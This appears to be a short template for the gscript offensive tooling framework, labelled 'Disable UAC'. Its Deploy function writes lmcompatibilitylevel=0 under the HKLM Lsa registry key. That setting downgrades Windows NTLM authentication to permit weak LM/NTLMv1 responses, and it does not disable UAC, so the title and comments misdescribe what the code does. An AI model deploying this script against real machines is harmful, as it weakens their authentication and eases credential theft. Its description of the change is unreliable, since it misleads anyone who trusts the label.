// Example gscript template
// Title: Disable UAC
// Author: ahhh
// Purpose: Disable UAC
// Gscript version: 1.0.0
// ATT&CK: 

//priority:90
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Disable UAC");

    var value = 0;
    // disable UAC
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\CurrentControlSet\\Control\\Lsa", "lmcompatibilitylevel", value);

    console.log("Done Disable UAC");
    return true;
  }
  